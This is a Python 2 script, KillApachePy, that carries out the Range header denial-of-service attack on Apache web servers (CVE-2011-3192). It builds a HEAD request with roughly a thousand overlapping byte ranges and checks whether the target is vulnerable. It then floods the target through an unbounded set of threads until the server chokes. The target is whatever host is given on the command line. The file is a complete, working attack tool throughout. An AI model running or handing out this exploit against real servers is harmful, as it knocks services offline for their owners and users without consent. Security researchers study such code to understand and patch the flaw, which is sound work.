#!/usr/bin/env python

import optparse, os, socket, threading, time

NAME        = "KillApachePy (Range Header DoS CVE-2011-3192)"
VERSION     = "0.1b"
AUTHOR      = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
LICENSE     = "Public domain (FREE)"
SHORT       = "You'll typically have to wait for 10-20 iterations before first connection timeouts"
REFERENCE   = "http://seclists.org/fulldisclosure/2011/Aug/175"

SLEEP_TIME = 5          # time to wait for new thread slots (after max number reached)
RECV_SIZE = 100         # receive buffer size in testing mode
RANGE_NUMBER = 1024     # number of range subitems forming the DoS payload
TIMEOUT = 10            # timeout for socket request

def attack(target):
    port = 443 if 'https' in target else 80
    if '://' in target:
        target = target[target.find('://') + 3:]
    if '/' not in target:
        page = "/"
    else:
        target, page = target.split('/', 1)
        page = "/%s" % page
    host, port = target.split(':') if ':' in target else (target, 80)

    def _send(recv=False):
        payload = ",".join("5-%d" % item for item in xrange(1, RANGE_NUMBER))
        packet = "HEAD %s HTTP/1.1\r\nHost: %s\r\nRange:bytes=0-,%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n" % (page, target, payload)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            s.connect((host, int(port)))
            s.send(packet)
            if recv:
                return s.recv(RECV_SIZE)
        except socket.error, msg:
            if 'timed out' in str(msg):
                print "\r(i) Server seems to be choked ('%s')" % msg
            else:
                print "(x) Socket error ('%s')" % msg
                if recv:
                    exit(-1)
        except Exception, msg:
            raise
        finally:
            s.close()

    if 'Partial' not in _send(True):
        print "(x) Target does not seem to be vulnerable"
    else:
        try:
            quit = False
            while not quit:
                threads = []
                print "(i) Creating new threads..."
                try:
                    while True:
                        thread = threading.Thread(target=_send)
                        thread.start()
                        threads.append(thread)
                except KeyboardInterrupt:
                    quit = True
                    raise
                except Exception, msg:
                    if 'new thread' in str(msg):
                        print "(i) Maximum number of new threads created (%d)" % len(threads)
                    else:
                        print "(x) Exception occured ('%s')" % msg
                finally:
                    if not quit:
                        print "(o) Waiting for %d seconds to acquire new threads" % SLEEP_TIME
                        time.sleep(SLEEP_TIME)
                        print
        except KeyboardInterrupt:
            print "\r(x) Ctrl-C was pressed"
            os._exit(1)

if __name__ == "__main__":
    print "%s #v%s\n by: %s\n\n(%s)\n" % (NAME, VERSION, AUTHOR, SHORT)
    parser = optparse.OptionParser(version=VERSION, option_list=[optparse.make_option("-t", dest="target", help="Target (e.g. \"www.target.com\")")])
    options, _ = parser.parse_args()
    if options.target:
        result = attack(options.target)
    else:
        parser.print_help()
